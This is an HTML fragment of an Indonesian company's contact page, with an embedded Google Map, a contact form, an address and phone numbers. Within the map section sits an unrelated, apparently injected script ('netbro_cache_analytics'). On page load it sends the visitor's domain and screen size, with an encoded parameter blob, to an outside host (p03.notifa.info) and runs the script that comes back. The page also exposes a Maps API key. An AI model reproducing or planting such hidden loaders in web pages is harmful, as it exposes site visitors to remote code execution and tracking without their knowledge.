<!-- Header -->
<header class="header p-0">
  <div class="h-500" id="map" data-marker-lat="-7.813108" data-marker-lng="110.3766936" data-remove-controls="true">
    <script type="text/javascript">
      if (self == top) {
        function netbro_cache_analytics(fn, callback) {
          setTimeout(function() {
            fn();
            callback();
          }, 0);
        }

        function sync(fn) {
          fn();
        }

        function requestCfs() {
          var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
          var idc_glo_r = Math.floor(Math.random() * 99999999999);
          var url = idc_glo_url + "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2tVLyfyNF%2bFahaiHjQyq6uSlK5xwuW1nQx6rbAyi1xC6xUAi%2fBP%2f9m7%2fhpAQJ002bI%2fI2t7QJZP8ZKZ3p6YOKi3CRI5Tc6UyW98xLC3HA2QGUZftl3ubxsIR%2fGLXglptmTkZFgJliFnLNwZR%2fTjbV4qw26f0ukBDaYEitENuCHS65CNvzLM8erDYZdhi7u9OhET%2bDSCSXFiSqczO3W7BNSP%2bxE%2fR34LPN3CjGH1jpvUmhpL5QvoJPCWCZpn2Cjdhv8jZ88YOsykkbVpfbvyFh8hgbMUMs43QwaeOyqYOIqihxi%2bigKHoP8uWjnQeUo%2b%2bjBnAVRz%2fFKdhJr7q8aQk6PUfDUT6FmgwuGJcXpTOzsalBsqeM5%2fhVuFLfFlDLTAGCjPq8JoAgV46pSHRNBR5i2b6EIjAI%2bR3oEBnQxnLW6TFU3xCNVtUk0XMScTwHjYhADgpykVI1cvI2hxxyW5bWHdxFK9pH86vJo%2fIXpmiP9Mn%2f7gG%2b7FNuUfXKDqFa3WHgnNagXR0NQqKNcFMo1YeDERMR9dTFwLVEPsLHaKN%2fTLJqgT99rH425jABnlu4qpLPHjgoIcHoxleLcUutw8yr4TlIB1s4jq%2f4" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
          var bsa = document.createElement('script');
          bsa.type = 'text/javascript';
          bsa.async = true;
          bsa.src = url;
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }
        netbro_cache_analytics(requestCfs, function() {});
      };
    </script>
    </body>
    <script>
      var map;

      function initMap() {
        var myLatLng = {
          lat: -7.813108,
          lng: 110.3745049
        };

        var map = new google.maps.Map(document.getElementById('map'), {
          zoom: 12,
          center: myLatLng,
          disableDefaultUI: true

        });

        var marker = new google.maps.Marker({
          position: myLatLng,
          map: map,
          title: 'Hello World!'
        });
      }
    </script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyD8n4QEGcGtkULm46S5kS29W_5v5aRFouU&callback=initMap" async defer></script>
  </div>
</header><!-- /.header -->


<!-- Main Content -->
<main class="main-content">


  <section class="section">
    <div class="container">

      <form class="row gap-y" action="../assets/php/sendmail.php" method="POST" data-form="mailer">
        <div class="col-lg-7">
          <h3>Hubungi Kami</h3>
          <br>

          <div class="alert alert-success d-on-success">Kami sudah meneriman pesan anda dan akan menghubungi anda secepat mungkin</div>

          <div class="form-row">
            <div class="form-group col-md-6">
              <input class="form-control form-control-lg" type="text" name="name" placeholder="Nama">
            </div>

            <div class="form-group col-md-6">
              <input class="form-control form-control-lg" type="email" name="email" placeholder="Email">
            </div>
          </div>

          <div class="form-group">
            <textarea class="form-control form-control-lg" rows="4" placeholder="Pesan Anda " name="message"></textarea>
          </div>

          <button class="btn btn-lg btn-primary" type="submit">Kirim Pesan</button>

        </div>


        <div class="col-lg-4 ml-auto text-center text-lg-left">
          <hr class="d-lg-none">
          <h3>Temukan Kami</h3>
          <br>
          <p>Jl. Taman Siswa No. 125<br>Yogyakarta,DIY, 55151</p>
          <p>08121561131<br>08127643463</p>
          <p>info@gi.co.id</p>
        </div>
      </form>

    </div>

  </section>



</main>